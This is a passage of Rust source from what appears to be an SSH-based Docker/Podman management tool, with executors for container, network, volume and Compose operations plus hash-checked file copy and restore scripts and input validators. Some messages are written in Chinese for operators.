impl OperationExecutor for DockerResourceMutationExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        self.recheck_snapshots().await?;
        self.service.target.validate(&self.plan.operation.target)?;
        let mut status = ResourceDispatchStatus {
            total: self.plan.targets.len(),
            attempted: 0,
            succeeded: 0,
            failed: 0,
            indeterminate: 0,
        };
        for target in &self.plan.targets {
            if status.attempted > 0
                && self
                    .service
                    .target
                    .validate(&self.plan.operation.target)
                    .is_err()
            {
                break;
            }
            let command = self.command_for(target)?;
            status.attempted += 1;
            match self
                .service
                .ssh
                .execute_bound(self.session, command, Duration::from_secs(45))
                .await
            {
                Ok(output) if !output.timed_out && output.exit_code == Some(0) => {
                    status.succeeded += 1;
                }
                Ok(output) if output.timed_out => {
                    status.indeterminate += 1;
                    break;
                }
                Ok(_) => status.failed += 1,
                Err(_) => {
                    status.indeterminate += 1;
                    break;
                }
            }
        }
        let skipped = status.total.saturating_sub(status.attempted);
        Ok(ExecutionReceipt {
            summary: format!(
                "resource dispatch: {}/{} attempted, {} succeeded, {} failed, {} indeterminate, {} skipped",
                status.attempted,
                status.total,
                status.succeeded,
                status.failed,
                status.indeterminate,
                skipped
            ),
            restore_token: Some(status.token()),
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let status = ResourceDispatchStatus::parse(receipt.restore_token.as_deref())?;
        let remaining = match self.plan.kind {
            DockerResourceMutationKind::RemoveNetwork
            | DockerResourceMutationKind::PruneNetworks => {
                let inventory = self
                    .service
                    .networks(self.session, self.plan.runtime)
                    .await?;
                if inventory.truncated {
                    return Err(CoreError::validation(
                        "Docker network verification",
                        "network inventory was truncated",
                    ));
                }
                let present = inventory
                    .items
                    .into_iter()
                    .map(|network| network.id)
                    .collect::<BTreeSet<_>>();
                self.plan
                    .targets
                    .iter()
                    .filter_map(|target| match target {
                        DockerResourceTarget::Network { id, name } if present.contains(id) => {
                            Some(name.clone())
                        }
                        _ => None,
                    })
                    .collect::<Vec<_>>()
            }
            DockerResourceMutationKind::RemoveVolume | DockerResourceMutationKind::PruneVolumes => {
                let inventory = self
                    .service
                    .volumes(self.session, self.plan.runtime)
                    .await?;
                if inventory.truncated {
                    return Err(CoreError::validation(
                        "Docker volume verification",
                        "volume inventory was truncated",
                    ));
                }
                let present = inventory
                    .items
                    .into_iter()
                    .map(|volume| volume.name)
                    .collect::<BTreeSet<_>>();
                self.plan
                    .targets
                    .iter()
                    .filter_map(|target| match target {
                        DockerResourceTarget::Volume { name } if present.contains(name) => {
                            Some(name.clone())
                        }
                        _ => None,
                    })
                    .collect::<Vec<_>>()
            }
        };
        let dispatch_ok = status.attempted == status.total
            && status.succeeded == status.total
            && status.failed == 0
            && status.indeterminate == 0;
        let passed = dispatch_ok && remaining.is_empty();
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!("{} 个已确认资源均已删除", status.total)
            } else {
                format!(
                    "没有全部删除：{} 个中成功 {} 个、失败 {} 个、结果不确定 {} 个；还剩 {} 个资源{}。",
                    status.total,
                    status.succeeded,
                    status.failed,
                    status.indeterminate,
                    remaining.len(),
                    if remaining.is_empty() {
                        String::new()
                    } else {
                        format!(
                            "：{}",
                            remaining.into_iter().take(8).collect::<Vec<_>>().join("、")
                        )
                    }
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        Err(CoreError::validation(
            "Docker resource restore",
            "resource deletion is irreversible",
        ))
    }
}

#[derive(Debug)]
struct DockerComposeActionExecutor<'a> {
    service: &'a DockerService,
    session: &'a BoundSshSession,
    plan: &'a DockerComposeActionPlan,
}

impl DockerComposeActionExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "Docker Compose operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }

    async fn current_project(&self) -> CoreResult<Option<DockerComposeProject>> {
        let inventory = self
            .service
            .compose_projects(self.session, self.plan.project.runtime)
            .await?;
        if inventory.truncated {
            return Err(CoreError::validation(
                "Docker Compose operation",
                "project inventory was truncated",
            ));
        }
        Ok(inventory
            .items
            .into_iter()
            .find(|project| project.name == self.plan.project.name))
    }
}

#[async_trait]
impl OperationExecutor for DockerComposeActionExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let current = self.current_project().await?.ok_or_else(|| {
            CoreError::validation(
                "Docker Compose operation precondition",
                "project disappeared before execution",
            )
        })?;
        if current != self.plan.project
            || parse_compose_config_files(&current.config_files)? != self.plan.config_files
        {
            return Err(CoreError::validation(
                "Docker Compose operation precondition",
                "project snapshot changed after confirmation was prepared",
            ));
        }
        self.service.target.validate(&self.plan.operation.target)?;
        let command = compose_action_command(self.plan)?;
        let result = self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(120))
            .await;
        let (summary, token) = match result {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => (
                format!("Compose {} command completed", self.plan.action.id()),
                "compose-dispatch/v1/ok",
            ),
            Ok(output) if output.timed_out => (
                format!("Compose {} command timed out", self.plan.action.id()),
                "compose-dispatch/v1/indeterminate",
            ),
            Ok(output) => (
                format!(
                    "Compose {} command exited {:?}: {}",
                    self.plan.action.id(),
                    output.exit_code,
                    sanitize_line(output.output.trim(), 256)
                ),
                "compose-dispatch/v1/failed",
            ),
            Err(error) => (
                format!(
                    "Compose {} dispatch became indeterminate: {}",
                    self.plan.action.id(),
                    sanitize_line(&error.to_string(), 256)
                ),
                "compose-dispatch/v1/indeterminate",
            ),
        };
        Ok(ExecutionReceipt {
            summary,
            restore_token: Some(token.to_owned()),
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let dispatch_ok = receipt.restore_token.as_deref() == Some("compose-dispatch/v1/ok");
        let current = self.current_project().await?;
        // Shown to the operator as is, so it is said in their language.
        let (state_ok, detail) = match (self.plan.action, current) {
            (DockerComposeAction::Down, None) => (true, "down 之后项目已经不在了。".to_owned()),
            (DockerComposeAction::Down, Some(project)) => (
                false,
                format!("down 之后项目还在，状态 {}。", project.status),
            ),
            (_, None) => (false, "操作之后找不到这个项目了。".to_owned()),
            (action, Some(project)) => {
                let config_matches =
                    parse_compose_config_files(&project.config_files)? == self.plan.config_files;
                let expected_state = match action {
                    DockerComposeAction::Up | DockerComposeAction::Restart => project.running > 0,
                    DockerComposeAction::Stop => project.running == 0,
                    DockerComposeAction::Pull => true,
                    DockerComposeAction::Down => unreachable!(),
                };
                (
                    config_matches && expected_state,
                    format!(
                        "项目状态 {}，运行中的容器 {} 个，配置文件{}。",
                        project.status,
                        project.running,
                        if config_matches {
                            "与确认时一致"
                        } else {
                            "和确认时不一样了"
                        }
                    ),
                )
            }
        };
        Ok(VerificationResult {
            passed: dispatch_ok && state_ok,
            detail: format!(
                "{}{detail}",
                if dispatch_ok {
                    "Compose 命令已执行。"
                } else {
                    "Compose 命令没有成功完成。"
                }
            ),
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        Err(CoreError::validation(
            "Docker Compose restore",
            "Compose actions are not automatically reversible",
        ))
    }
}

#[derive(Debug)]
struct DockerActionExecutor<'a> {
    service: &'a DockerService,
    session: &'a BoundSshSession,
    action: &'a DockerActionPlan,
}

impl DockerActionExecutor<'_> {
    fn ensure_plan(&self, plan: &OperationPlan) -> CoreResult<()> {
        if plan.id != self.action.operation.id || plan.target != self.action.operation.target {
            return Err(CoreError::validation(
                "Docker operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for DockerActionExecutor<'_> {
    async fn execute(&self, plan: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(plan)?;
        let current = self
            .service
            .probe_state(self.session, &self.action.container)
            .await?;
        if current != self.action.before_state {
            return Err(CoreError::validation(
                "Docker operation precondition",
                format!(
                    "container state changed from {} to {current}; create a new plan",
                    self.action.before_state
                ),
            ));
        }
        let output = self
            .service
            .raw_command(
                self.session,
                self.action.execute_command.clone(),
                Duration::from_secs(45),
            )
            .await?;
        let stdout = successful_output("change container state", output)?;
        let (summary, _) = sanitize_multiline(stdout.trim(), 512);
        Ok(ExecutionReceipt {
            summary,
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        plan: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(plan)?;
        let output = self
            .service
            .raw_command(
                self.session,
                self.action.verify_command.clone(),
                Duration::from_secs(15),
            )
            .await?;
        if self.action.action == ContainerAction::Remove {
            let passed = output.exit_code.is_some_and(|code| code != 0) && !output.timed_out;
            return Ok(VerificationResult {
                passed,
                detail: if passed {
                    "容器已经不存在了。".to_owned()
                } else {
                    "容器还在，或者删除后的复核超时了。".to_owned()
                },
            });
        }
        let state = successful_output("verify container state", output)?;
        // The state is one word on its own line. Taking the whole output would
        // glue a runtime's deprecation warning onto it, and the comparison
        // below would then fail for a change that worked — telling the
        // operator nothing was done when something was.
        let state = sanitize_line(first_output_line(&state), 64);
        let passed = self
            .action
            .expected_states
            .iter()
            .any(|value| value == &state);
        // Says the state whether it passed or not: on failure that reading is
        // the only thing telling the operator what the host actually did.
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!("复核读回的状态是 {state}，与预期一致。")
            } else {
                format!(
                    "复核读回的状态是 {state}，预期 {}。",
                    self.action.expected_states.join(" 或 ")
                )
            },
        })
    }

    async fn restore(&self, plan: &OperationPlan, _receipt: &ExecutionReceipt) -> CoreResult<()> {
        self.ensure_plan(plan)?;
        let command = self.action.restore_command.clone().ok_or_else(|| {
            CoreError::validation("Docker restore", "this action is not reversible")
        })?;
        let output = self
            .service
            .raw_command(self.session, command, Duration::from_secs(45))
            .await?;
        successful_output("restore container state", output)?;
        let restored = self
            .service
            .probe_state(self.session, &self.action.container)
            .await?;
        if !self
            .action
            .restore_expected_states
            .iter()
            .any(|state| state == &restored)
        {
            return Err(CoreError::validation(
                "Docker restore verification",
                format!("回滚后读回的状态是 {restored}，没有回到操作前的样子"),
            ));
        }
        Ok(())
    }
}

fn container_file_probe_command(container: &ContainerIdentity, path: &ContainerFilePath) -> String {
    container_exec_script_command(container, &container_file_probe_script(path))
}

/// The probe on its own, for any exec that runs `sh -c`: a pod's as well as a
/// container's. Kind, length and SHA-256 in one marker line.
pub(crate) fn container_file_probe_script(path: &ContainerFilePath) -> String {
    format!(
        "set -eu; path={path}; parent={parent}; \
         [ -d \"$parent\" ] && [ ! -L \"$parent\" ] || {{ printf 'unsafe-parent\\n'; exit 42; }}; \
         if [ -L \"$path\" ]; then printf 'unsafe\\n'; exit 42; \
         elif [ -f \"$path\" ]; then \
           hash=$(sha256sum \"$path\" | awk '{{print $1}}'); \
           bytes=$(wc -c < \"$path\" | tr -d '[:space:]'); \
           printf 'file\\t%s\\t%s\\n' \"$hash\" \"$bytes\"; \
         elif [ -e \"$path\" ]; then printf 'unsafe\\n'; exit 42; \
         else printf 'missing\\n'; fi",
        path = shq(path.as_str()),
        parent = shq(path.parent().expect("validated path has a parent").as_str()),
    )
}

fn host_file_probe_command(path: &RemotePath) -> CoreResult<String> {
    let parent = path.parent()?;
    let script = format!(
        "set -eu; path={path}; parent={parent}; \
         [ -d \"$parent\" ] && [ ! -L \"$parent\" ] || {{ printf 'unsafe-parent\\n'; exit 42; }}; \
         if [ -L \"$path\" ]; then printf 'unsafe\\n'; exit 42; \
         elif [ -f \"$path\" ]; then \
           hash=$(sha256sum \"$path\" | awk '{{print $1}}'); \
           bytes=$(wc -c < \"$path\" | tr -d '[:space:]'); \
           printf 'file\\t%s\\t%s\\n' \"$hash\" \"$bytes\"; \
         elif [ -e \"$path\" ]; then printf 'unsafe\\n'; exit 42; \
         else printf 'missing\\n'; fi",
        path = shq(path.as_str()),
        parent = shq(parent.as_str()),
    );
    Ok(format!("sh -c {}", shq(&script)))
}

fn copy_to_temporary_command(plan: &DockerFileCopyPlan) -> CoreResult<String> {
    match (&plan.source, &plan.target_temporary) {
        (DockerFileEndpoint::Container(source), DockerFileEndpoint::Host(temporary)) => {
            let script = format!(
                "set -eu; [ ! -e {temporary} ] && [ ! -L {temporary} ]; {runtime} cp {source} {temporary}",
                temporary = shq(temporary.as_str()),
                runtime = plan.container.runtime.command(),
                source = shq(&format!("{}:{}", plan.container.id(), source.as_str())),
            );
            Ok(format!("sh -c {}", shq(&script)))
        }
        (DockerFileEndpoint::Host(source), DockerFileEndpoint::Container(temporary)) => {
            let preflight = container_exec_script_command(
                &plan.container,
                &format!(
                    "set -eu; [ ! -e {temporary} ] && [ ! -L {temporary} ]",
                    temporary = shq(temporary.as_str())
                ),
            );
            Ok(format!(
                "{preflight} && {} cp {} {}",
                plan.container.runtime.command(),
                shq(source.as_str()),
                shq(&format!("{}:{}", plan.container.id(), temporary.as_str()))
            ))
        }
        (DockerFileEndpoint::Container(source), DockerFileEndpoint::Container(temporary)) => {
            Ok(container_exec_script_command(
                &plan.container,
                &format!(
                    "set -eu; [ ! -e {temporary} ] && [ ! -L {temporary} ]; cp -a {source} {temporary}",
                    source = shq(source.as_str()),
                    temporary = shq(temporary.as_str())
                ),
            ))
        }
        _ => Err(CoreError::validation(
            "Docker file copy",
            "source and target domains do not match the selected direction",
        )),
    }
}

fn copy_install_command(plan: &DockerFileCopyPlan) -> CoreResult<String> {
    let precondition = match &plan.target_before {
        ContainerFileState::Missing => {
            "[ ! -e \"$path\" ] && [ ! -L \"$path\" ] || exit 44;".to_owned()
        }
        ContainerFileState::File { sha256, .. } => format!(
            "[ -f \"$path\" ] && [ ! -L \"$path\" ] || exit 44; \
             current=$(sha256sum \"$path\" | awk '{{print $1}}'); \
             [ \"$current\" = {} ] || exit 44; \
             [ ! -e \"$backup\" ] && [ ! -L \"$backup\" ] || exit 45; \
             cp -a \"$path\" \"$backup\"; \
             mode=$(stat -c %a \"$backup\"); owner=$(stat -c %u:%g \"$backup\"); \
             chmod \"$mode\" \"$temp\"; chown \"$owner\" \"$temp\";",
            shq(sha256)
        ),
    };
    let (expected_sha256, expected_bytes) = match &plan.source_revision {
        ContainerFileState::File { sha256, bytes } => (sha256, bytes),
        ContainerFileState::Missing => {
            return Err(CoreError::validation(
                "Docker file copy",
                "copy source revision is missing",
            ));
        }
    };
    let script = format!(
        "set -eu; path={path}; temp={temp}; backup={backup}; \
         [ -f \"$temp\" ] && [ ! -L \"$temp\" ] || exit 46; \
         temp_hash=$(sha256sum \"$temp\" | awk '{{print $1}}'); \
         temp_bytes=$(wc -c < \"$temp\" | tr -d '[:space:]'); \
         [ \"$temp_hash\" = {expected_sha256} ] && [ \"$temp_bytes\" = {expected_bytes} ] || exit 48; \
         {precondition} mv -f \"$temp\" \"$path\"; printf 'installed\\n'",
        path = shq(plan.target.path()),
        temp = shq(plan.target_temporary.path()),
        backup = shq(plan.target_backup.path()),
        expected_sha256 = shq(expected_sha256),
        expected_bytes = shq(&expected_bytes.to_string()),
    );
    endpoint_script_command(&plan.container, &plan.target, &script)
}

fn copy_cleanup_command(plan: &DockerFileCopyPlan) -> CoreResult<String> {
    let script = match plan.target_before {
        ContainerFileState::Missing => {
            format!("set -eu; rm -f {}", shq(plan.target_temporary.path()))
        }
        ContainerFileState::File { .. } => format!(
            "set -eu; rm -f {temporary} {backup}",
            temporary = shq(plan.target_temporary.path()),
            backup = shq(plan.target_backup.path()),
        ),
    };
    endpoint_script_command(&plan.container, &plan.target, &script)
}

fn copy_restore_command(plan: &DockerFileCopyPlan) -> CoreResult<String> {
    let restore = match &plan.target_before {
        ContainerFileState::Missing => format!("rm -f {}", shq(plan.target.path())),
        ContainerFileState::File { .. } => {
            "[ -f \"$backup\" ] && [ ! -L \"$backup\" ] || exit 47; cp -a \"$backup\" \"$path\""
                .to_owned()
        }
    };
    let cleanup = match plan.target_before {
        ContainerFileState::Missing => "rm -f \"$temp\"".to_owned(),
        ContainerFileState::File { .. } => "rm -f \"$temp\" \"$backup\"".to_owned(),
    };
    let script = format!(
        "set -eu; path={path}; temp={temp}; backup={backup}; {restore}; {cleanup}",
        path = shq(plan.target.path()),
        temp = shq(plan.target_temporary.path()),
        backup = shq(plan.target_backup.path()),
    );
    endpoint_script_command(&plan.container, &plan.target, &script)
}

fn endpoint_script_command(
    container: &ContainerIdentity,
    endpoint: &DockerFileEndpoint,
    script: &str,
) -> CoreResult<String> {
    match endpoint {
        DockerFileEndpoint::Host(_) => Ok(format!("sh -c {}", shq(script))),
        DockerFileEndpoint::Container(_) => Ok(container_exec_script_command(container, script)),
    }
}

fn container_file_copy_command(
    container: &ContainerIdentity,
    plan: &DockerFileWritePlan,
) -> String {
    format!(
        "{} cp {} {}",
        container.runtime.command(),
        shq(plan.host_temp_path.as_str()),
        shq(&format!(
            "{}:{}",
            container.id(),
            plan.container_temp_path.as_str()
        ))
    )
}

fn container_file_install_command(
    container: &ContainerIdentity,
    plan: &DockerFileWritePlan,
) -> String {
    let precondition = match &plan.before {
        ContainerFileState::Missing => {
            "[ ! -e \"$path\" ] && [ ! -L \"$path\" ] || exit 44;".to_owned()
        }
        ContainerFileState::File { sha256, .. } => format!(
            "[ -f \"$path\" ] && [ ! -L \"$path\" ] || exit 44; \
             current=$(sha256sum \"$path\" | awk '{{print $1}}'); \
             [ \"$current\" = {} ] || exit 44; \
             [ ! -e \"$backup\" ] && [ ! -L \"$backup\" ] || exit 45; \
             cp -a \"$path\" \"$backup\"; \
             mode=$(stat -c %a \"$backup\"); owner=$(stat -c %u:%g \"$backup\"); \
             chmod \"$mode\" \"$temp\"; chown \"$owner\" \"$temp\";",
            shq(sha256)
        ),
    };
    let script = format!(
        "set -eu; path={path}; temp={temp}; backup={backup}; \
         [ -f \"$temp\" ] && [ ! -L \"$temp\" ] || exit 46; \
         {precondition} mv -f \"$temp\" \"$path\"; printf 'installed\\n'",
        path = shq(plan.path.as_str()),
        temp = shq(plan.container_temp_path.as_str()),
        backup = shq(plan.backup_path.as_str()),
    );
    container_exec_script_command(container, &script)
}

fn container_file_cleanup_command(
    container: &ContainerIdentity,
    plan: &DockerFileWritePlan,
) -> String {
    let script = format!(
        "set -eu; rm -f {temp} {backup}",
        temp = shq(plan.container_temp_path.as_str()),
        backup = shq(plan.backup_path.as_str()),
    );
    container_exec_script_command(container, &script)
}

fn container_file_restore_command(
    container: &ContainerIdentity,
    plan: &DockerFileWritePlan,
) -> String {
    let restore = match &plan.before {
        ContainerFileState::Missing => format!("rm -f {}", shq(plan.path.as_str())),
        ContainerFileState::File { .. } => {
            "[ -f \"$backup\" ] && [ ! -L \"$backup\" ] || exit 47; cp -a \"$backup\" \"$path\""
                .to_owned()
        }
    };
    let script = format!(
        "set -eu; path={path}; temp={temp}; backup={backup}; {restore}; \
         rm -f \"$temp\" \"$backup\"",
        path = shq(plan.path.as_str()),
        temp = shq(plan.container_temp_path.as_str()),
        backup = shq(plan.backup_path.as_str()),
    );
    container_exec_script_command(container, &script)
}

fn container_exec_script_command(container: &ContainerIdentity, script: &str) -> String {
    format!(
        "{} exec -- {} sh -c {}",
        container.runtime.command(),
        shq(container.id()),
        shq(script)
    )
}

pub(crate) fn parse_container_file_state(output: &str) -> CoreResult<ContainerFileState> {
    let line = output.trim();
    if line == "missing" {
        return Ok(ContainerFileState::Missing);
    }
    let mut fields = line.split('\t');
    if fields.next() != Some("file") {
        return Err(CoreError::validation(
            "container file state",
            "runtime returned an unknown file-state marker",
        ));
    }
    let sha256 = fields.next().unwrap_or_default();
    let bytes = fields
        .next()
        .ok_or_else(|| {
            CoreError::validation("container file state", "missing byte length in file marker")
        })?
        .parse::<u64>()
        .map_err(|_| {
            CoreError::validation("container file state", "invalid byte length in file marker")
        })?;
    if fields.next().is_some()
        || sha256.len() != 64
        || !sha256.bytes().all(|byte| byte.is_ascii_hexdigit())
    {
        return Err(CoreError::validation(
            "container file state",
            "invalid SHA-256 file marker",
        ));
    }
    Ok(ContainerFileState::File {
        sha256: sha256.to_ascii_lowercase(),
        bytes,
    })
}

pub(crate) fn sha256_hex(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

fn build_action_plan(
    target: TargetGuard,
    request: &ContainerActionRequest,
    before_state: &str,
) -> CoreResult<DockerActionPlan> {
    validate_container_id(request.container.id())?;
    let before_state = normalize_state(before_state)?;
    validate_action_precondition(request.action, &before_state)?;
    let runtime = request.container.runtime.command();
    let id = shq(request.container.id());
    let expected_states = match request.action {
        ContainerAction::Start | ContainerAction::Restart | ContainerAction::Unpause => {
            vec!["running".to_owned()]
        }
        ContainerAction::Stop => vec!["exited".to_owned()],
        ContainerAction::Pause => vec!["paused".to_owned()],
        ContainerAction::Kill => vec!["exited".to_owned(), "dead".to_owned()],
        ContainerAction::Remove => Vec::new(),
    };
    // These two strings are what the operator reads before approving, so they
    // are written for a person: what will happen, and what putting it back
    // would mean. The shell verbs above stay as the runtime spells them.
    let (restore_command, restore_expected_states, restore_description) = match request.action {
        ContainerAction::Start if before_state == "exited" => (
            Some(format!("{runtime} stop -- {id}")),
            vec![before_state.clone()],
            Some("把容器停回原来的已退出状态".to_owned()),
        ),
        ContainerAction::Stop if before_state == "paused" => (
            Some(format!(
                "{runtime} start -- {id} && {runtime} pause -- {id}"
            )),
            vec!["paused".to_owned()],
            Some("重新启动容器并暂停，回到原来的暂停状态".to_owned()),
        ),
        ContainerAction::Stop => (
            Some(format!("{runtime} start -- {id}")),
            vec!["running".to_owned()],
            Some("把容器重新启动起来".to_owned()),
        ),
        ContainerAction::Pause => (
            Some(format!("{runtime} unpause -- {id}")),
            vec!["running".to_owned()],
            Some("恢复容器运行".to_owned()),
        ),
        ContainerAction::Unpause => (
            Some(format!("{runtime} pause -- {id}")),
            vec!["paused".to_owned()],
            Some("把容器重新暂停".to_owned()),
        ),
        ContainerAction::Start
        | ContainerAction::Restart
        | ContainerAction::Kill
        | ContainerAction::Remove => (None, Vec::new(), None),
    };
    let mut operation = OperationPlan::new(
        target,
        format!(
            "{}容器 {}（{}，当前状态 {before_state}）",
            request.action.label(),
            short_id(request.container.id()),
            request.container.runtime.label()
        ),
        true,
        restore_description,
    )?;
    operation
        .metadata
        .insert("container-id".to_owned(), request.container.id().to_owned());
    operation
        .metadata
        .insert("before-state".to_owned(), before_state.clone());
    operation
        .metadata
        .insert("action".to_owned(), request.action.verb().to_owned());
    Ok(DockerActionPlan {
        operation,
        container: request.container.clone(),
        action: request.action,
        before_state,
        execute_command: format!("{runtime} {} -- {id}", request.action.verb()),
        verify_command: format!("{runtime} inspect --format '{{{{.State.Status}}}}' -- {id}"),
        expected_states,
        restore_command,
        restore_expected_states,
    })
}

fn validate_action_precondition(action: ContainerAction, state: &str) -> CoreResult<()> {
    if action.is_available_in_state(state) {
        Ok(())
    } else {
        Err(CoreError::validation(
            "Docker action precondition",
            format!("cannot {} a container in state {state}", action.verb()),
        ))
    }
}

fn normalize_state(state: &str) -> CoreResult<String> {
    let state = state.trim().to_ascii_lowercase();
    if matches!(
        state.as_str(),
        "created" | "running" | "paused" | "restarting" | "removing" | "exited" | "dead"
    ) {
        Ok(state)
    } else {
        Err(CoreError::validation(
            "container state",
            "remote runtime returned an unknown state",
        ))
    }
}

fn validate_container_id(value: &str) -> CoreResult<()> {
    validate_runtime_hex_id("container id", value)
}

fn validate_runtime_hex_id(subject: &'static str, value: &str) -> CoreResult<()> {
    if (12..=64).contains(&value.len()) && value.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        Ok(())
    } else {
        Err(CoreError::validation(
            subject,
            "must be a 12..=64 character hexadecimal runtime id",
        ))
    }
}

/// An image id, in either of the two forms a runtime prints it: the digest
/// form `sha256:<64 hex>` that `--no-trunc` gives, or the bare hex that the
/// truncated listing gives. Podman prints the bare form even with
/// `--no-trunc`, so both have to be accepted.
fn validate_image_id(value: &str) -> CoreResult<()> {
    validate_runtime_hex_id(
        "container image id",
        value.strip_prefix("sha256:").unwrap_or(value),
    )
}

fn validate_volume_name(value: &str) -> CoreResult<()> {
    if (1..=255).contains(&value.len())
        && value
            .bytes()
            .next()
            .is_some_and(|byte| byte.is_ascii_alphanumeric())
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'.' | b'-'))
    {
        Ok(())
    } else {
        Err(CoreError::validation(
            "container volume name",
            "must be 1..=255 ASCII alphanumeric, dot, underscore, or dash characters and start with an alphanumeric character",
        ))
    }
}

fn validate_compose_project_name(value: &str) -> CoreResult<()> {
    if (1..=128).contains(&value.len())
        && value
            .bytes()
            .next()
            .is_some_and(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit())
        && value.bytes().all(|byte| {
            byte.is_ascii_lowercase() || byte.is_ascii_digit() || matches!(byte, b'_' | b'-')
        })
    {
        Ok(())
    } else {
        Err(CoreError::validation(
            "compose project name",
            "must be 1..=128 lowercase ASCII alphanumeric, underscore, or dash characters and start with an alphanumeric character",
        ))
    }
}

fn validate_logs_request(request: &ContainerLogsRequest) -> CoreResult<()> {
    validate_container_id(request.container.id())?;
    if !(1..=10_000).contains(&request.tail) {
        return Err(CoreError::validation(
            "container log tail",
            "must be 1..=10000",
        ));
    }
    if !request.stdout && !request.stderr {
        return Err(CoreError::validation(
            "container log streams",
            "at least one of stdout or stderr must be selected",
        ));
    }
    if request.since.as_deref().is_some_and(|since| {
        since.trim().is_empty()
            || since.len() > 128
            || since.chars().any(|character| character.is_control())
    }) {
        return Err(CoreError::validation(
            "container log since",
            "must be non-empty, control-free, and at most 128 bytes",
        ));
    }
    Ok(())
}

fn inspect_command(container: &ContainerIdentity) -> CoreResult<String> {
    validate_container_id(container.id())?;
    Ok(format!(
        "{} inspect -- {}",
        container.runtime.command(),
        shq(container.id())
    ))
}

fn network_inspect_command(network: &DockerNetwork) -> CoreResult<String> {
    validate_runtime_hex_id("container network id", &network.id)?;
    Ok(format!(
        "{} network inspect -- {}",
        network.runtime.command(),
        shq(&network.id)
    ))
}

fn image_inspect_command(image: &ContainerImage) -> CoreResult<String> {
    validate_image_id(&image.id)?;
    Ok(format!(
        "{} image inspect -- {}",
        image.runtime.command(),
        shq(&image.id)
    ))
}

fn image_history_command(image: &ContainerImage) -> CoreResult<String> {
    validate_image_id(&image.id)?;
    Ok(format!(
        "{} image history --no-trunc --format '{{{{json .}}}}' -- {}",
        image.runtime.command(),
        shq(&image.id)
    ))
}

fn volume_inspect_command(volume: &DockerVolume) -> CoreResult<String> {
    validate_volume_name(&volume.name)?;
    Ok(format!(
        "{} volume inspect -- {}",
        volume.runtime.command(),
        shq(&volume.name)
    ))
}

fn logs_command(request: &ContainerLogsRequest) -> String {
    // Here stderr is the container's own, so it cannot be discarded as diff
    // and top discard theirs. Podman on a cgroups v1 host writes a deprecation
    // warning there on every command, which read as the container's last log
    // line; this variable is Podman's own switch for that one warning.
    let quiet = match request.container.runtime {
        ContainerRuntime::Podman => "PODMAN_IGNORE_CGROUPSV1_WARNING=1 ",
        ContainerRuntime::Docker => "",
    };
    let mut command = format!(
        "{quiet}{} logs --tail {}",
        request.container.runtime.command(),
        request.tail
    );
    if request.timestamps {
        command.push_str(" --timestamps");
    }
    if let Some(since) = request.since.as_deref() {
        command.push_str(" --since ");
        command.push_str(&shq(since));
    }
    command.push_str(" -- ");
    command.push_str(&shq(request.container.id()));
    match (request.stdout, request.stderr) {
        (true, false) => command.push_str(" 2>/dev/null"),
        (false, true) => command.push_str(" 1>/dev/null"),
        _ => {}
    }
    command
}

fn successful_output(subject: &'static str, output: SshCommandOutput) -> CoreResult<String> {
    if output.timed_out {
        return Err(CoreError::validation(subject, "remote command timed out"));
    }
    if output.exit_code != Some(0) {
        let detail = sanitize_line(output.output.trim(), 512);
        return Err(CoreError::validation(
            subject,
            format!("remote command exited {:?}: {detail}", output.exit_code),
        ));
    }
    Ok(output.output)
}

fn parse_container_list(
    runtime: ContainerRuntime,
    output: &str,
) -> CoreResult<DockerCollection<ContainerSummary>> {
    let (rows, truncated) = json_rows(output, "container list")?;
    let mut items = Vec::with_capacity(rows.len());
    for row in rows {
        // Docker and Podman print the same command's output in different
        // shapes, so every field is read from whichever key is actually there.
        // Reading only Docker's names made a Podman host answer "no
        // containers", which is not a smaller answer — it is a wrong one.
        let identity = ContainerIdentity::new(runtime, required_json_alias(&row, &["ID", "Id"])?)?;
        items.push(ContainerSummary {
            identity,
            name: container_name(&row),
            image: json_text(&row, "Image", 1_024),
            state: json_text(&row, "State", 64).to_ascii_lowercase(),
            // Podman leaves `Status` empty for a running container and puts
            // the answer in `State`; an empty status column would read as
            // "unknown" rather than "running".
            status: first_non_empty(&[
                json_text(&row, "Status", 512),
                json_text(&row, "State", 512),
            ]),
            ports: container_ports(&row),
            // Podman's `CreatedAt` is empty and `Created` carries the time.
            created_at: first_non_empty(&[
                json_text(&row, "CreatedAt", 512),
                json_text(&row, "Created", 512),
            ]),
            command: text_or_joined(&row, "Command", 4_096),
        });
    }
    items.sort_by(|left, right| {
        left.name
            .to_lowercase()
            .cmp(&right.name.to_lowercase())
            .then_with(|| left.identity.cmp(&right.identity))
    });
    Ok(DockerCollection { items, truncated })
}

fn parse_container_stats(
    runtime: ContainerRuntime,
    output: &str,
